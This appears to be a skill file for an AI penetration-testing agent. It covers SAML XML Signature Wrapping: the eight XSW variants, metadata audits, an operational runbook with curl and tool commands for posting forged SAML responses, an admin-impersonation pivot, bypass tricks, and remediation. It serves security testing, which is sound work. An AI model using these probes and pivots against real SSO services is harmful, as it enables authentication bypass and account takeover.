---
name: saml-xsw
description: SAML XML Signature Wrapping (8 XSW variants) + SP configuration audit for signature-enforcement bypass
triggers: [saml, sso, xsw, signature wrapping, idp, sp, federation, samlresponse, acs]
---

# SAML XML Signature Wrapping (XSW)

SAML SPs validate a signed Assertion, then process an Assertion. When the *validated* element and the *processed* element are different, the SP grants a session as whoever the attacker's Assertion names. Somorovsky et al. 2012 ("On Breaking SAML: Be Whoever You Want to Be") catalogued 8 canonical structural mutations that achieve this. A correctly-implemented SP rejects all 8; vulnerable SPs accept at least one.

This skill complements `scan_saml_xsw` (PR #321). Use the skill when the agent needs to reason about *why* a probe succeeded, when to capture a donor assertion, or how to escalate from "SP accepts unsigned" to "auth bypass with attacker-controlled identity".

## Attack Surface

**Where SAML lives in a modern stack**
- Workforce SSO: Okta / Azure AD / Auth0 / OneLogin / PingFederate as IdP; SP libraries: Shibboleth, SimpleSAMLphp, OneLogin's `python3-saml`, pysaml2, Spring SAML, OmniAuth-saml, Passport-saml.
- B2B / customer SSO: SP-initiated flows for enterprise tenants. Usually only enabled for high-value plans.
- Federation hubs: ADFS, Microsoft Entra, Okta Workforce.

**SP-side surfaces to probe**
- `AssertionConsumerService` (ACS) endpoint — accepts POSTed SAMLResponse + RelayState
- SP metadata endpoint — advertises `WantAssertionsSigned`, signing algorithms, ACS URLs
- IdP-initiated vs SP-initiated flow gates
- Single Logout (SLO) endpoint — same signature-validation bugs apply

**Standard metadata paths to try**
- `/Shibboleth.sso/Metadata`
- `/saml2/metadata` · `/saml/metadata`
- `/sso/saml/metadata` · `/auth/saml/metadata`
- `/api/saml/metadata`
- `/.well-known/saml-metadata`
- `/simplesaml/saml2/idp/metadata.php` (SimpleSAMLphp default)
- `/metadata.xml`

## Key Vulnerabilities

### Configuration-level
- `WantAssertionsSigned="false"` in SPSSODescriptor — SP declares it doesn't require signed Assertions. **Critical, CWE-347.**
- Advertised SHA-1 / MD5 in SignatureMethod or DigestMethod — collision-feasible. **Medium, CWE-327.**
- Missing AuthnRequestsSigned — SP-initiated flows accept unsigned AuthnRequests.
- Encryption disabled when sensitive attributes (SSN, role, group) carried.

### Active SP behaviour bugs
- ACS accepts a fully **unsigned** SAML Response → grants session.
- ACS accepts a Response with a **syntactically-present but cryptographically-invalid** `<ds:Signature>` (zero-byte SignatureValue + DigestValue). The "checks for presence but doesn't validate" bug.
- ACS accepts one or more of the 8 XSW variants below.

## The 8 Canonical XSW Variants

The mutations preserve the donor's signature byte-for-byte; what changes is *which* element the SP processes vs *which* element the signature actually covers.

| # | Structural mutation | What it tests |
|---|---|---|
| **XSW1** | Evil Assertion appended *after* signed Assertion inside Response | SP processes last-Assertion-wins |
| **XSW2** | Evil Assertion appended *before* signed Assertion | SP processes first-Assertion-wins |
| **XSW3** | Original moved to `samlp:Extensions`; evil Assertion takes its place | SP ignores Extensions; processes evil |
| **XSW4** | Signed Assertion nested *inside* an evil wrapper Assertion | SP processes outer envelope |
| **XSW5** | NameID rewritten in-place; pristine copy stashed in Extensions for Reference URI resolution | SP processes mutated outer; signature validates against pristine inner |
| **XSW6** | Like XSW5 but signature stays inside the modified Assertion | SPs that "find signature inside processed Assertion" trust it |
| **XSW7** | Evil Assertion before Extensions(pristine); structural variant of XSW3 | XPath-vs-DOM differential |
| **XSW8** | Original moved inside `ds:Object` of `<ds:Signature>`; evil takes Assertion slot | SP processes evil; signature validates against pristine-in-Object |

## Detection Channels

### Phase 1 — SP metadata audit (no auth needed)
```bash
# Pull metadata; parse with xmllint
for path in /Shibboleth.sso/Metadata /saml2/metadata /saml/metadata /sso/saml/metadata; do
  curl -s "https://<TARGET>${path}" > /tmp/sp_metadata.xml && break
done
xmllint --xpath '//*[local-name()="SPSSODescriptor"]/@WantAssertionsSigned' /tmp/sp_metadata.xml
xmllint --xpath '//*[local-name()="SignatureMethod"]/@Algorithm' /tmp/sp_metadata.xml
xmllint --xpath '//*[local-name()="AssertionConsumerService"]/@Location' /tmp/sp_metadata.xml
```

If `WantAssertionsSigned="false"` → high finding before any active probing.
If algorithm contains `rsa-sha1` / `hmac-sha1` / `dsa-sha1` / `md5` → medium finding.

### Phase 2 — active ACS probes (no donor needed)
- **Unsigned Response**: build a minimal `samlp:Response` with no `<ds:Signature>` element; POST as `SAMLResponse=<b64>&RelayState=<rs>` to ACS. If 302 → in-app path or 200 with session cookie → critical.
- **Mangled signature**: same Response but with a syntactically present `<ds:Signature>` whose SignatureValue + DigestValue are all-zero base64. Catches "checks element exists; doesn't validate" SPs.

### Phase 3 — XSW variant probes (requires donor)
Capture a donor: log into the application as a low-privilege user, capture the SAMLResponse POST via Burp / browser devtools. That base64 blob is the donor. The signature inside is real; you'll mutate the structure around it.

For each variant 1-8, synthesise the mutated Response, base64 it, POST to ACS. Use `scan_saml_xsw --donor-assertion <b64>` for the automated path.

## Operational Runbook

### Step 1 — discover + audit

```bash
# Metadata pull + audit
strix scan_saml_xsw --url 'https://<sp-host>/'

# Or manual:
curl -s 'https://<sp-host>/saml2/metadata' | xmllint --format -
```

Triage `WantAssertionsSigned` first. If `false` or absent, you already have a high finding; Phase 2 + 3 confirm whether it's exploitable in practice.

### Step 2 — capture a donor (legitimate flow)

```bash
# In Burp / browser devtools:
# 1. Start a fresh login flow as the low-priv user.
# 2. Capture the POST to /saml/acs (or wherever the ACS lives).
# 3. URL-decode the `SAMLResponse=` form field.
# 4. The decoded blob is base64 of the donor XML.

echo 'PHNhbWxwOlJlc3BvbnNl...' | base64 -d > /tmp/donor.xml
xmllint --format /tmp/donor.xml | head -50
```

Verify the donor has a real `<ds:Signature>` block inside `<saml:Assertion>` (most common) or at the `<samlp:Response>` level.

### Step 3 — fire the full probe

```bash
strix scan_saml_xsw \
  --url 'https://<sp-host>/' \
  --acs-url 'https://<sp-host>/saml/acs' \
  --donor-assertion "$(base64 -w0 /tmp/donor.xml)" \
  --relay-state '/dashboard'
```

10 POSTs fire: 1 unsigned + 1 mangled-sig + 8 XSW variants. Each is classified accepted / rejected / inconclusive based on response shape (302 to in-app path, session-shaped Set-Cookie, signature-rejection wording in body).

### Step 4 — confirm an "accepted" variant manually

```bash
# Build the variant payload by hand for evidence
# (scan_saml_xsw._build_xsw_variant exposes the transform)
python3 -c "
from strix.tools.specialist.scan_saml_xsw import _build_xsw_variant
donor = open('/tmp/donor.xml').read()
print(_build_xsw_variant(donor_xml=donor, variant=3))
" > /tmp/xsw3.xml

XSW3_B64=$(base64 -w0 /tmp/xsw3.xml)
curl -s -i -X POST 'https://<sp-host>/saml/acs' \
  -d "SAMLResponse=$(python3 -c "import urllib.parse;print(urllib.parse.quote('$XSW3_B64'))')&RelayState=/dashboard" \
  -H 'Content-Type: application/x-www-form-urlencoded'
```

Inspect headers for `Set-Cookie: session=...` and `Location: /dashboard`. That's the **evidence** for the finding.

### Step 5 — pivot

Once a variant is accepted, the attacker controls the Subject. Pivot to the highest-impact identity:

- Replace `<saml:NameID>` with the email of an admin user.
- For attribute-based RBAC, modify `<saml:AttributeStatement>` to add `role=admin` or `groups=superuser`.
- Re-fire the same XSW variant; verify the resulting session has admin scope.

## Bypass Techniques

- **XML Comments**: some SPs strip comments before validation; injecting `<!-- attacker@target.com -->` inside NameID can split the validated text from the processed text.
- **XMLDSig transforms abuse**: when the donor uses `enveloped-signature` + `c14n`, some validators apply transforms in different order than the processor.
- **NamespaceDifferential**: rename `samlp:` to `samlp2:` in the evil Assertion; validators that XPath-by-prefix vs by-localname may differ.
- **Inline DTD**: rare but devastating — declare an entity that resolves to a benign value at validation time but expands differently at processing time (most SPs disable inline DTDs; SSRF + XXE skills cover the cases where they don't).

## Validation

1. Confirm the SP returned a session-shaped response (302 to in-app path / Set-Cookie with session-like name) on the XSW probe.
2. Log in to the session with a follow-up request (e.g., `curl --cookie 'SESSION=<captured>' https://<sp-host>/api/me`) and confirm the response identity matches the **attacker-injected** Subject, not the donor's original.
3. Replay against a fresh session in a different browser to rule out cookie-binding-by-IP.
4. Capture the full payload bytes + the response headers as evidence.

## False Positives

- ACS returned 302 to `/login` or `/error` — that's a rejection, not an accepted session.
- ACS returned 200 with body containing `"signature"`, `"verification failed"`, `"invalid signature"` — SP rejected; classifier may have mis-scored.
- SP enforces `WantAssertionsSigned="true"` at the middleware but advertises `false` in metadata — rare but happens with mis-synced configs. Confirm with active probe.

## Impact

- Authentication bypass as any user the IdP can issue Subjects for — typically including admins.
- Persistent session escalation when the SP issues long-lived cookies post-SAML.
- Lateral movement when the SP federates downstream services (Office 365 / Salesforce / internal apps) using the same SAML session.

## Remediation

1. Validate that the signed Reference URI matches the *exact element* the SP processes. Element identity, not just ID-attribute equality.
2. Reject Responses with more than one Assertion (or one Response inside an Object) — none of these are normal SAML traffic.
3. Use SAML libraries known to be XSW-hardened: pysaml2 ≥ 7.0, python3-saml ≥ 1.13, modern Shibboleth, Spring SAML 2.x+.
4. Enable `WantAssertionsSigned="true"` AT THE SP MIDDLEWARE — don't rely solely on the metadata advertisement.
5. Enforce signature algorithm allow-list (RSA-SHA256 / ECDSA-SHA256 + SHA-256 digest minimum).
6. Add CI test cases for XSW1-8: `strix scan_saml_xsw --acs-url <staging> --donor-assertion <CI-fixture>` in pipeline.

## Pro Tips

1. Many SPs ship vulnerable to *one specific variant* — usually XSW3 or XSW6. Run the full 8-variant sweep; don't stop at the first rejection.
2. Capture donors from a **low-priv user**, exploit them to land as **high-priv**. The signature is honest; only the structure lies.
3. SAML SLO (Single Logout) endpoints often share the signature-validation code with ACS. If ACS is hardened, SLO sometimes isn't.
4. `Destination` attribute mismatch is a common SP check — make sure the mutated Response's `Destination=` matches the ACS URL exactly.
5. RelayState is operator-controlled — useful for post-auth landing page steering, not as part of the bypass.

## Summary

XSW is the canonical SAML attack class. The defence is straightforward (validate-the-element-you-process); the attack class has nine years of mature exploitation tooling against SPs that don't. When auditing SAML, the metadata audit is free; the active probes are cheap; the variant probes need a donor assertion. Skip none of them.
